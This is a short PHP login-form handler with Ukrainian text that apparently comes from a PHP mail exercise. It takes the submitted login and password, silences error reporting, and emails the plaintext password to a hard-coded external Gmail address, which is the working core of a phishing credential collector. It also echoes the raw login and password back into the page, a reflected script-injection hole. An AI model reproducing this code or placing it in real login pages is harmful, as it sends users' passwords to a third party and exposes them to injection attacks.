<?php error_reporting(0);
$loginFix = $_POST['login'];
$passwordFix = $_POST['parole'];
$checkRemember = $_POST['remember'];
$subj = "6th letter";
$text = "Привіт, ".$loginFix."!<br>Це твоє 6-те поштове повідомлення надіслане за допомогою PHP<br>Ваш пароль: ".$passwordFix;
$info = "Привіт, ".$loginFix."!<br>Ваш пароль".$passwordFix;

mail("ipolishuk790@gmail.com", $subj, $text, "Content-type: text/html; charset=utf-8 \r\n");
echo ($info);

